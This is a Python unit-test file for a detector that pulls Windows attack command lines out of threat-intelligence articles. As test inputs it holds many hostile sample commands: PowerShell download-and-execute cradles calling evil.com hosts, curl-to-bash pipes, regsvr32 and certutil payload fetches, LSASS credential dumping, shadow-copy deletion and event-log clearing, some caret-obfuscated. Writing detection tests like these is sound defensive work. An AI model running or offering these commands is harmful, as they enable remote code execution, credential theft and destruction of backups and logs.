"""Unit tests for cmdline_attention_preprocessor."""

import pytest

from src.services.cmdline_attention_preprocessor import _expand_to_boundary, process

pytestmark = pytest.mark.unit


def test_empty_article():
    """Empty article returns empty snippets and full_article."""
    result = process("")
    assert result["high_likelihood_snippets"] == []
    assert result["full_article"] == ""

    result = process("   \n\n  ")
    assert result["high_likelihood_snippets"] == []
    assert result["full_article"] == "   \n\n  "


def test_case_insensitivity():
    """POWERSHELL, Cmd.exe, RUNDLL32 all match (case-insensitive)."""
    for text in ["POWERSHELL -enc test", "Cmd.exe /c whoami", "RUNDLL32 foo.dll,Bar"]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"Expected match for: {text}"
        assert result["full_article"] == text


def test_cmd_boundary_command_cmdlet_no_match():
    """'command' and 'cmdlet' do NOT match (cmd boundary guard)."""
    for text in ["The command failed.", "Use the cmdlet to process."]:
        result = process(text)
        assert result["high_likelihood_snippets"] == [], f"Expected no match for: {text}"


def test_cmd_boundary_matches():
    """'cmd /c' and 'cmd.exe' DO match."""
    for text in ["Run cmd /c whoami", "Execute cmd.exe /c echo test"]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"Expected match for: {text}"


def test_powershell_enc_captured():
    """Article with powershell -enc captures snippet."""
    text = "The attacker used powershell -enc to decode the payload."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "powershell" in result["high_likelihood_snippets"][0].lower()
    assert result["full_article"] == text


def test_cmd_exe_whoami_captured():
    """Article with cmd.exe /c whoami captures snippet."""
    text = "Use cmd.exe /c whoami to check privileges."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "cmd" in result["high_likelihood_snippets"][0].lower()
    assert result["full_article"] == text


def test_exe_full_path_captured():
    """Full-path .exe reference (C:\\...\\net.exe) captures snippet via R1 structural rule.

    Note: "C:\\" and "system32" string anchors were removed (too broad).
    This test verifies R1 (.exe + non-narrative argument token) still fires.
    """
    text = "The binary at C:\\Windows\\System32\\net.exe was executed."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert result["full_article"] == text


def test_deduplication():
    """Same snippet from multiple anchors appears once."""
    text = "powershell -enc AAA && rundll32 foo.dll,Bar"
    result = process(text)
    snippets = result["high_likelihood_snippets"]
    assert len(snippets) >= 1
    # Same line should not appear twice
    assert len(snippets) == len(set(snippets))


def test_surrounding_context():
    """±1 surrounding line/sentence included."""
    text = "Previous line.\nThe attacker ran powershell -enc payload.\nNext line."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    snippet = result["high_likelihood_snippets"][0]
    assert "powershell" in snippet.lower()


def test_no_anchors_preserves_full_article():
    """No anchors → empty snippets, full_article preserved."""
    text = "This is a prose-only article with no Windows commands."
    result = process(text)
    assert result["high_likelihood_snippets"] == []
    assert result["full_article"] == text


def test_regex_anchors_reg_add():
    """Regex anchor: reg add captured."""
    text = "Modify registry: reg add HKLM\\Software\\Test /v Key /d Value"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


def test_regex_anchors_encodedcommand():
    """Regex anchor: -encodedcommand captured."""
    text = "powershell -encodedcommand JABjAG8AbQBtAGEAbgBk"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


def test_regex_anchors_rundll32():
    """Regex anchor: rundll32.exe foo.dll,Bar captured."""
    text = "rundll32.exe C:\\temp\\foo.dll,ExportFunc"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


def test_snippets_preserve_article_order():
    """Snippets appear in same order as article."""
    text = "First: certutil -urlcache. Second: bitsadmin /transfer."
    result = process(text)
    snippets = result["high_likelihood_snippets"]
    assert len(snippets) >= 1
    # If multiple snippets, first should come before second in article
    if len(snippets) >= 2:
        first_pos = text.find(snippets[0].split("\n")[0][:20])
        second_pos = text.find(snippets[1].split("\n")[0][:20])
        if first_pos >= 0 and second_pos >= 0:
            assert first_pos < second_pos


def test_prose_only_article_with_late_command():
    """Article-602-class: long prose with command embedded late."""
    prose = "This is a long intrusion report. " * 20
    command_line = "The attacker then ran certutil -urlcache to download the payload."
    text = prose + "\n\n" + command_line
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "certutil" in result["high_likelihood_snippets"][0].lower()
    assert result["full_article"] == text


def test_anchor_inside_code_block_and_prose():
    """Anchor in code block + prose: dedupe works, no double capture."""
    text = """In the script block:
```powershell
powershell -enc base64payload
```
The same command was also mentioned in prose: powershell -enc base64payload
"""
    result = process(text)
    snippets = result["high_likelihood_snippets"]
    # Should capture but dedupe - exact same snippet may appear once
    assert len(snippets) >= 1
    assert result["full_article"] == text


def test_rule1_exe_path_plus_argument():
    """Rule 1: .exe path (quoted or unquoted) + at least one argument token."""
    for text in [
        "C:\\Tools\\mimikatz.exe privilege::debug",
        '"C:\\Program Files\\tool.exe" /install',
    ]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"Expected match for: {text}"


def test_rule2_quoted_exe_nonpunctuation():
    """Rule 2: Quoted .exe + whitespace + non-punctuation → capture line."""
    text = '"C:\\Temp\\payload.exe" Invoke'
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "payload.exe" in result["high_likelihood_snippets"][0]


def test_rule4_exe_bare_verb():
    """Rule 4: .exe followed by bare word verb (e.g., tool.exe verb args)."""
    text = "The binary custom.exe install --silent was used."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "custom.exe" in result["high_likelihood_snippets"][0]


def test_rule5_two_or_more_windows_paths():
    """Rule 5: Line with two or more Windows paths (C:\\...)."""
    text = "Copy from C:\\Users\\Admin\\file.exe to C:\\Temp\\output.exe"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "C:\\" in result["high_likelihood_snippets"][0]


def test_narrative_exe_no_match():
    """Narrative .exe mention (e.g. GT_NET.exe (Grixba)) should NOT match - no invocation shape."""
    text = "The binary GT_NET.exe (Grixba) was used by the attacker."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) == 0


def test_narrative_exe_process_no_match():
    """MSBuild.exe process reached out - narrative verb 'process' should NOT match."""
    text = ".exe child process have been commonly observed. MSBuild.exe process reached out to Pastebin."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) == 0


def test_cmdline_extract_byte_preserving_no_sentence_split():
    """CmdlineExtract: no split on period; newline boundaries only (HARD CONTRACT)."""
    # Long line with period mid-sentence - should NOT split on period when agent=CmdlineExtract
    text = "x" * 300 + ". " + "y" * 300 + "\nThe attacker ran certutil -urlcache to download."
    process(text)  # agent_name=None
    result_cmdline = process(text, agent_name="CmdlineExtract")
    # With CmdlineExtract, we use full-line capture for long lines (byte_preserving)
    # so we get the full matching line, not sentence-split parts
    assert len(result_cmdline["high_likelihood_snippets"]) >= 1
    snippet = result_cmdline["high_likelihood_snippets"][0]
    # Must contain newline (we capture ±1 lines)
    assert "\n" in snippet or "certutil" in snippet
    # full_article unchanged
    assert result_cmdline["full_article"] == text


def test_expand_to_boundary_newline_only():
    """_expand_to_boundary with newline_only=True uses newline boundaries only, not period."""
    full_line = "prefix. match. suffix"
    start_off, end_off = 8, 13  # "match"
    result_newline = _expand_to_boundary(full_line, start_off, end_off, newline_only=True)
    result_sentence = _expand_to_boundary(full_line, start_off, end_off, newline_only=False)
    # newline_only=True: no \n in line, so full line returned (no period split)
    assert result_newline == "prefix. match. suffix"
    # newline_only=False: SENTENCE_SPLIT splits on ". ", yielding "match." (period included)
    assert result_sentence == "match."


def test_long_line_multiple_anchors_both_captured():
    """Long line with multiple anchors: both commands appear in output.

    When anchors are close (windows overlap) they merge into one snippet.
    When anchors are far (windows don't overlap) they produce separate snippets.
    Either way, content from both anchors must be present somewhere in the output.
    """
    long_prose = "This is a long intrusion report. " * 40
    cmd1 = "The attacker ran certutil -urlcache to download."
    cmd2 = "Then they used bitsadmin /transfer to exfiltrate."
    text = long_prose + cmd1 + " " + long_prose[:200] + " " + cmd2
    result = process(text)
    all_snippets = " ".join(result["high_likelihood_snippets"]).lower()
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "certutil" in all_snippets
    assert "bitsadmin" in all_snippets


# ---------------------------------------------------------------------------
# Snippet runaway cap (max_snippets parameter)
# ---------------------------------------------------------------------------


def _make_dense_article(n: int = 320) -> str:
    """Build an article with n distinct matching command lines followed by prose."""
    lines = [
        f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
        for i in range(n)
    ]
    lines.append("This is the actual article body with important threat intelligence content." * 20)
    return "\n".join(lines)


def test_max_snippets_none_returns_all():
    """max_snippets=None places no upper bound on snippet count."""
    article = _make_dense_article(50)
    result = process(article, agent_name="CmdlineExtract", max_snippets=None)
    assert len(result["high_likelihood_snippets"]) == 50


def test_max_snippets_cap_applied():
    """max_snippets trims excess snippets from the end, preserving early ones."""
    article = _make_dense_article(320)
    result = process(article, agent_name="CmdlineExtract", max_snippets=100)
    snippets = result["high_likelihood_snippets"]
    assert len(snippets) <= 100
    # First snippet is preserved (high-signal early content kept)
    assert "0000" in snippets[0]


def test_max_snippets_zero_returns_empty():
    """max_snippets=0 returns no snippets (edge case)."""
    article = _make_dense_article(10)
    result = process(article, agent_name="CmdlineExtract", max_snippets=0)
    assert result["high_likelihood_snippets"] == []


def test_sc_no_false_positives():
    """'sc' promoted to regex: Microsoft, describe, scan, transcript must NOT match via sc."""
    for text in [
        "The Microsoft Security team investigated the incident.",
        "We describe the attack chain in detail below.",
        "The scanner detected suspicious activity.",
        "A transcript of the session was captured.",
        "The scope of the breach was limited.",
    ]:
        result = process(text)
        assert result["high_likelihood_snippets"] == [], f"sc false-positive for: {text!r}"


def test_sc_regex_anchor_matches_real_usage():
    """'sc' regex fires on actual sc.exe invocation shapes."""
    for text in [
        "sc start MyService",
        "sc.exe stop Defender",
        "sc create malware binPath= C:\\evil.exe",
        "sc query type= service state= all",
    ]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"sc missed real usage: {text!r}"


def test_cmd_slash_question_mark_no_match():
    """/? (help flag) was removed from the cmd-flag regex: no attack-signal value."""
    # /? with no other LOLBAS anchors should no longer produce a snippet
    text = "Run the binary with /? to see usage options."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], "'/?' alone should not trigger after removal"


def test_long_line_threshold_boundary():
    """Lines of 499 vs 501 chars both produce a snippet (pins the LONG_LINE_THRESHOLD=500 boundary)."""
    anchor = "powershell -enc "
    # 499-char line: goes through _extract_snippet (full-line path)
    filler = "A" * (499 - len(anchor))
    short_line = anchor + filler
    assert len(short_line) == 499
    result_short = process(short_line)
    assert len(result_short["high_likelihood_snippets"]) >= 1, "499-char line should produce a snippet"

    # 501-char line: goes through _extract_windowed_snippets (windowed path)
    filler = "A" * (501 - len(anchor))
    long_line = anchor + filler
    assert len(long_line) == 501
    result_long = process(long_line)
    assert len(result_long["high_likelihood_snippets"]) >= 1, "501-char line should produce a snippet"


def test_overlapping_windows_are_merged():
    """Two close anchors on a long line produce ONE merged snippet, not two overlapping ones.

    Without window merging, both windows overlap significantly and emit different-but-
    mostly-duplicated strings that the exact-string dedup misses. With merging they
    collapse to a single snippet.
    """
    # Build a line > 500 chars with two anchors separated by ~110 chars
    # (both within 2*MATCH_WINDOW_CHARS=700 of each other, so windows definitely overlap)
    prefix = "X" * 250
    gap = "Y" * 110
    suffix = "Z" * 250
    line = prefix + "powershell" + gap + "certutil" + suffix
    assert len(line) > 500  # must trigger windowed path

    result = process(line)
    snippets = result["high_likelihood_snippets"]
    # Both anchors are within one merged window -- should be exactly 1 snippet
    assert len(snippets) == 1, f"Expected 1 merged snippet, got {len(snippets)}"
    # The single snippet must contain both anchor words
    assert "powershell" in snippets[0].lower()
    assert "certutil" in snippets[0].lower()


def test_runaway_snippet_token_budget():
    """Token-budget cap (25% of context) prevents snippets crowding out article content.

    Simulates the llm_service.py capping logic using the same formula
    (len(text) // 4 tokens per snippet). With 320 snippets of ~120 chars each
    and a 4000-token context budget, fewer than 320 snippets must survive.
    """
    snippets = [
        f"powershell -enc {i:04d} -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/{i}')"
        for i in range(320)
    ]

    context_limit_tokens = 4000
    max_snippet_tokens = int(context_limit_tokens * 0.25)  # 1000 tokens

    kept: list[str] = []
    budget = max_snippet_tokens
    for s in snippets:
        cost = len(s) // 4 + 2  # mirrors _estimate_tokens + separator
        if cost > budget:
            break
        kept.append(s)
        budget -= cost

    capped = kept or snippets[:1]

    # Far fewer than 320 should fit within 25% of a 4000-token context
    assert len(capped) < 320
    # At least one snippet must survive (always keep the highest-signal first)
    assert len(capped) >= 1
    # Tokens consumed by capped snippets must not exceed budget
    total_cost = sum(len(s) // 4 + 2 for s in capped)
    assert total_cost <= max_snippet_tokens


# ---------------------------------------------------------------------------
# Contract LOLBin anchors (STRING_ANCHORS additions)
# ---------------------------------------------------------------------------


def test_whoami_bare_utility_captured():
    """whoami /all in narrative prose surfaces a snippet (no .exe required)."""
    text = "The threat actor executed whoami /all to enumerate group memberships."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "whoami" in result["high_likelihood_snippets"][0].lower()


def test_nltest_bare_utility_captured():
    """nltest /domain_trusts in narrative prose surfaces a snippet."""
    text = "Domain enumeration was performed using nltest /domain_trusts against the target."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "nltest" in result["high_likelihood_snippets"][0].lower()


def test_vssadmin_captured():
    """vssadmin delete shadows /all in prose surfaces a snippet."""
    text = "Ransomware deleted backups: vssadmin delete shadows /all /quiet was observed."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "vssadmin" in result["high_likelihood_snippets"][0].lower()


def test_wevtutil_captured():
    """wevtutil in prose surfaces a snippet (event log wiping)."""
    text = "Defense evasion included wevtutil cl System to clear the System event log."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "wevtutil" in result["high_likelihood_snippets"][0].lower()


def test_bcdedit_captured():
    """bcdedit in prose surfaces a snippet (boot config modification)."""
    text = "Persistence was achieved via bcdedit /set safeboot minimal on the victim host."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "bcdedit" in result["high_likelihood_snippets"][0].lower()


# ---------------------------------------------------------------------------
# PowerShell execution flag anchors (STRING_ANCHORS additions)
# ---------------------------------------------------------------------------


def test_noprofile_without_powershell_keyword_captured():
    """-NoProfile on a line without 'powershell' keyword still surfaces a snippet."""
    text = "The script was invoked with -NoProfile -WindowStyle Hidden to avoid detection."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert (
        "-NoProfile" in result["high_likelihood_snippets"][0]
        or "-noprofile" in result["high_likelihood_snippets"][0].lower()
    )


def test_executionpolicy_flag_captured():
    """-ExecutionPolicy in prose surfaces a snippet."""
    text = "Attackers bypassed defenses using -ExecutionPolicy Bypass before running the payload."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


# ---------------------------------------------------------------------------
# net verb-guarded REGEX anchor
# ---------------------------------------------------------------------------


def test_net_user_domain_captured():
    """net user /domain surfaces a snippet via verb-guarded regex."""
    text = "The adversary ran net user /domain to enumerate domain accounts."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "net user" in result["high_likelihood_snippets"][0].lower()


def test_net_localgroup_captured():
    """net localgroup with argument surfaces a snippet."""
    text = 'Privilege escalation check: net localgroup "Domain Admins" /add user1'
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


def test_net_bare_prose_no_match():
    """Bare 'network connectivity' does NOT produce a snippet (noise guard)."""
    text = "The malware checked network connectivity before exfiltrating data."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"'network' should not fire net anchor: {result}"


# ---------------------------------------------------------------------------
# expand regex tightening
# ---------------------------------------------------------------------------


def test_expand_prose_no_match():
    """'expand the attack surface' does NOT produce a snippet after tightening."""
    text = "Attackers seek to expand the attack surface by exploiting exposed services."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], "'expand' prose should not fire"


def test_expand_with_windows_path_captured():
    """expand followed by a Windows drive path surfaces a snippet."""
    text = "The payload was decompressed using expand C:\\temp\\file.dl_ -F:* ."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "expand" in result["high_likelihood_snippets"][0].lower()


# ---------------------------------------------------------------------------
# NARRATIVE_VERBS extension
# ---------------------------------------------------------------------------


def test_narrative_exe_executed_suppressed():
    """'MSBuild.exe executed silently' is suppressed — 'executed' now in NARRATIVE_VERBS."""
    text = "MSBuild.exe executed silently in the background without user interaction."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"Narrative 'executed' should be suppressed: {result}"


def test_narrative_exe_launched_suppressed():
    """'tool.exe launched quietly' is suppressed — 'launched' now in NARRATIVE_VERBS."""
    text = "The implant tool.exe launched quietly after user logon."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"Narrative 'launched' should be suppressed: {result}"


def test_exe_with_arg_indicator_not_suppressed():
    """msbuild.exe with a real flag is NOT suppressed despite 'executed' being a narrative verb."""
    text = "msbuild.exe executed /t:Build /p:Configuration=Release project.csproj"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1, "Arg indicator '/' must override narrative suppression"


# ---------------------------------------------------------------------------
# FP regression: removed anchors must NOT fire on prose mentions
# ---------------------------------------------------------------------------


def test_system32_prose_no_match():
    """'system32' anchor removed: pure directory mention without .exe + arg does not fire."""
    text = "The System32 directory contains essential Windows components and system DLLs."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"system32 prose should not fire: {result}"


def test_c_drive_prose_no_match():
    """'C:\\' anchor removed: single path mention in prose does not fire (R5 needs two paths)."""
    text = "Malware was found in the C:\\Users\\victim directory during the investigation."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"C:\\ prose should not fire: {result}"


def test_hklm_prose_no_match():
    """HKLM/HKCU regex removed: registry hive mention in prose does not fire."""
    for text in [
        "The malware added a Run key at HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
        "Persistence was achieved via HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
        "The implant modified HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services.",
    ]:
        result = process(text)
        assert result["high_likelihood_snippets"] == [], f"HKLM/HKCU prose should not fire: {text!r}"


def test_ftp_protocol_prose_no_match():
    """'ftp' anchor removed: FTP protocol description does not fire."""
    text = "The firewall blocks outbound FTP connections on port 21 by default."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"ftp prose should not fire: {result}"


def test_ipconfig_no_match():
    """'ipconfig' anchor removed: does not fire (was weakest LOLBin, single-token)."""
    text = "Run ipconfig to check your network configuration and IP address."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"ipconfig should not fire after removal: {result}"


def test_tasklist_no_match():
    """'tasklist' anchor removed: bare tasklist mention does not fire."""
    text = "The analyst used tasklist to enumerate running processes on the host."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"tasklist should not fire after removal: {result}"


# ---------------------------------------------------------------------------
# New string anchors — coverage gap fills
# ---------------------------------------------------------------------------


def test_regsvr32_captured():
    """regsvr32 (T1218.010 Squiblydoo) surfaces a snippet."""
    text = (
        "The actor registered a malicious COM object using regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
    )
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "regsvr32" in result["high_likelihood_snippets"][0].lower()


def test_mimikatz_captured():
    """mimikatz surfaces a snippet (T1003 credential access)."""
    text = "The attacker ran mimikatz.exe to extract plaintext credentials from LSASS memory."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "mimikatz" in result["high_likelihood_snippets"][0].lower()


def test_sekurlsa_captured():
    """sekurlsa (mimikatz module) surfaces a snippet."""
    text = "Credentials were extracted via sekurlsa::logonpasswords in the post-exploitation phase."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "sekurlsa" in result["high_likelihood_snippets"][0].lower()


def test_comsvcs_lsass_dump_captured():
    """comsvcs MiniDump pattern (T1003.001) surfaces a snippet."""
    text = "LSASS was dumped using: rundll32 comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    all_text = " ".join(result["high_likelihood_snippets"]).lower()
    assert "comsvcs" in all_text or "lsass" in all_text


def test_lsass_bare_reference_captured():
    """Bare 'lsass' in cmdline context surfaces a snippet."""
    text = "procdump -ma lsass.exe C:\\Temp\\lsass.dmp"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1


def test_procdump_captured():
    """procdump (T1003.001 LSASS dump tool) surfaces a snippet."""
    text = "The threat actor used procdump -ma lsass.exe to dump credentials from memory."
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "procdump" in result["high_likelihood_snippets"][0].lower()


def test_downloadfile_captured():
    """DownloadFile (.NET download cradle) surfaces a snippet."""
    text = "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe', 'C:\\Temp\\p.exe')"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    all_text = " ".join(result["high_likelihood_snippets"]).lower()
    assert "downloadfile" in all_text or "webclient" in all_text


def test_webclient_download_cradle_captured():
    """WebClient class reference in a download cradle surfaces a snippet."""
    text = "$wc = New-Object System.Net.WebClient; $wc.DownloadData('http://c2.evil.com/stager')"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    all_text = " ".join(result["high_likelihood_snippets"]).lower()
    assert "webclient" in all_text or "downloaddata" in all_text


def test_mavinject_captured():
    """mavinject (T1055.001 DLL injection LOLBIN) surfaces a snippet."""
    text = "DLL injection was performed via mavinject.exe /INJECTRUNNING 1234 C:\\Temp\\evil.dll"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "mavinject" in result["high_likelihood_snippets"][0].lower()


# ---------------------------------------------------------------------------
# New regex anchors — coverage gap fills
# ---------------------------------------------------------------------------


def test_tftp_boundary_captured():
    """tftp (promoted to regex with word boundary) surfaces a snippet."""
    text = "The attacker transferred the payload using tftp -i 192.168.1.10 GET evil.exe"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "tftp" in result["high_likelihood_snippets"][0].lower()


def test_hh_exe_captured():
    """hh.exe (T1218.001 Compiled HTML Help) with argument surfaces a snippet."""
    for text in [
        "hh.exe C:\\Users\\victim\\AppData\\Local\\Temp\\malicious.chm",
        "hh C:\\evil.chm",
    ]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"hh.exe missed: {text!r}"


def test_wsl_captured():
    """wsl.exe (T1202 indirect execution) surfaces a snippet."""
    text = "The attacker used wsl.exe -e /bin/bash -c 'curl http://evil.com/payload | bash'"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "wsl" in result["high_likelihood_snippets"][0].lower()


def test_bash_execution_flag_captured():
    """bash -c (T1202 indirect execution) surfaces a snippet."""
    for text in [
        "bash -c 'curl http://c2.evil.com/stager | bash'",
        "bash.exe -c whoami",
    ]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"bash -c missed: {text!r}"


def test_bash_bare_prose_no_match():
    """Bare 'bash' without execution flag does not fire (fires on shell scripting prose)."""
    text = "The implant was written as a bash script to maintain persistence across reboots."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"bare 'bash' in prose should not fire: {result}"


def test_at_scheduler_captured():
    """at.exe (T1053.002 legacy scheduler) with time argument surfaces a snippet."""
    for text in [
        "at 13:00 cmd /c evil.exe",
        "at.exe 09:30 /interactive powershell",
    ]:
        result = process(text)
        assert len(result["high_likelihood_snippets"]) >= 1, f"at scheduler missed: {text!r}"


def test_at_bare_prose_no_match():
    """'at' without a time argument does not fire (avoids 'at' substring noise)."""
    text = "The attacker arrived at the target network and established persistence."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"'at' prose should not fire: {result}"


# ---------------------------------------------------------------------------
# Caret normalization — cmd.exe obfuscation evasion
# ---------------------------------------------------------------------------


def test_caret_obfuscation_powershell():
    """p^ow^er^sh^ell fires the powershell anchor after caret stripping."""
    text = "p^ow^er^sh^ell -enc JABjAG8AbQBtAGEAbgBk"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1, "Caret-obfuscated powershell must be detected"
    # Snippet must preserve the original obfuscated text (not the stripped copy)
    assert "^" in result["high_likelihood_snippets"][0], "Original caret form must be preserved in snippet"


def test_caret_obfuscation_certutil():
    """c^er^tu^til fires the certutil anchor after caret stripping."""
    text = "c^er^tu^til -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1, "Caret-obfuscated certutil must be detected"


def test_caret_obfuscation_cmd():
    """c^md fires the cmd boundary regex after caret stripping."""
    text = "c^md /c whoami && net user /domain"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1, "Caret-obfuscated cmd must be detected"


def test_caret_original_preserved_in_snippet():
    """Snippet always contains original (carets intact), not the normalized form."""
    text = "r^u^n^d^l^l^3^2.exe C:\\Temp\\evil.dll,EntryPoint"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    # The original carets must be in the snippet — full_article is never modified
    snippet = result["high_likelihood_snippets"][0]
    assert "^" in snippet, "Snippet must contain original caret-obfuscated text"
    assert result["full_article"] == text


def test_no_carets_no_extra_pass():
    """Lines without carets take the fast path (line_norm == line short-circuit)."""
    # Behaviorally identical — just verify no regression on clean input
    text = "powershell -enc JABjAG8AbQBtAGEAbgBk"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1
    assert "^" not in result["high_likelihood_snippets"][0]


# ---------------------------------------------------------------------------
# NARRATIVE_VERBS expansion
# ---------------------------------------------------------------------------


def test_narrative_verb_using_suppressed():
    """'tool.exe using the feature' is suppressed — 'using' is now a narrative verb."""
    text = "MSBuild.exe using the AppDomain feature for code execution was documented."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"'using' should suppress: {result}"


def test_narrative_verb_via_suppressed():
    """'tool.exe via a reflective loader' is suppressed — 'via' is now a narrative verb."""
    text = "The implant ran custom.exe via a reflective loader without touching disk."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"'via' should suppress: {result}"


def test_narrative_verb_running_suppressed():
    """'tool.exe running in the background' is suppressed — 'running' is now a narrative verb."""
    text = "Defenders observed svchost.exe running in the context of a malicious service."
    result = process(text)
    assert result["high_likelihood_snippets"] == [], f"'running' should suppress: {result}"


def test_narrative_verb_with_arg_indicator_not_suppressed():
    """Even with a narrative verb, a real arg indicator overrides suppression."""
    text = "msbuild.exe using /t:Rebuild /p:Configuration=Release project.csproj"
    result = process(text)
    assert len(result["high_likelihood_snippets"]) >= 1, "Arg indicator '/' must override 'using' suppression"
